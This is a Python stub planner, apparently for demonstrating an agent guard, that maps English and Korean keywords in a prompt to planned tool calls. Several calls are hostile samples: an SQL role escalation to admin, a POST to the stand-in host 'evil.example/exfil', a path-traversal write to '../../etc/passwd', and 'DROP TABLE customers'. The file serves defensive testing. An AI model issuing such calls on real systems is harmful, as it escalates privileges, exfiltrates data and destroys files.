"""Planned tool call before D agent guard."""

from __future__ import annotations

from typing import Any

from pydantic import BaseModel, Field


class PlannedToolCall(BaseModel):
    tool: str
    arguments: dict[str, Any] = Field(default_factory=dict)
    call_id: str = "c-call-1"
    rationale: str = ""


def plan_tools(prompt: str) -> list[PlannedToolCall]:
    """Keyword stub planner — maps user intent to D-compatible tools."""
    lower = prompt.lower()
    calls: list[PlannedToolCall] = []
    n = 1

    def add(tool: str, arguments: dict[str, Any], rationale: str) -> None:
        nonlocal n
        calls.append(
            PlannedToolCall(
                tool=tool,
                arguments=arguments,
                call_id=f"c-call-{n}",
                rationale=rationale,
            )
        )
        n += 1

    # Destructive / denied intents first (demo clarity)
    if any(k in lower for k in ("admin으로", "role을", "update users", "db write", "업데이트해")):
        add(
            "db_write",
            {"sql": "UPDATE users SET role='admin' WHERE id=1"},
            "user asked to mutate DB",
        )
    if any(k in lower for k in ("외부 api", "external api", "webhook", "exfil", "evil.example")):
        add(
            "external_api",
            {"url": "https://evil.example/exfil", "method": "POST"},
            "user asked for external API call",
        )
    if any(k in lower for k in ("passwd", "rm -rf", "/etc/", "파일에 써", "file write")):
        add(
            "file_write",
            {"path": "../../etc/passwd", "content": "x"},
            "user asked for sensitive file write",
        )
    if any(k in lower for k in ("메일", "email", "이메일 보내", "메일 보내")):
        add(
            "email",
            {"to": "ops@example.com", "subject": "요청 처리", "body": prompt[:200]},
            "user asked to send email",
        )
    if any(k in lower for k in ("검색", "찾아", "search", "날씨", "조회해줘")) and not calls:
        add("search", {"query": prompt[:120]}, "informational lookup")
    if any(k in lower for k in ("select", "조회", "db read", "주문 목록", "읽어")):
        # Avoid duplicating if already planning write
        if not any(c.tool == "db_write" for c in calls):
            sql = "SELECT id, status FROM orders LIMIT 10"
            if "drop" in lower:
                sql = "DROP TABLE customers"
            add("db_read", {"sql": sql}, "user asked for DB read")

    if not calls:
        # Default: harmless search so agent path always shows a tool hop
        add("search", {"query": prompt[:120]}, "default search fallback")

    return calls[:3]
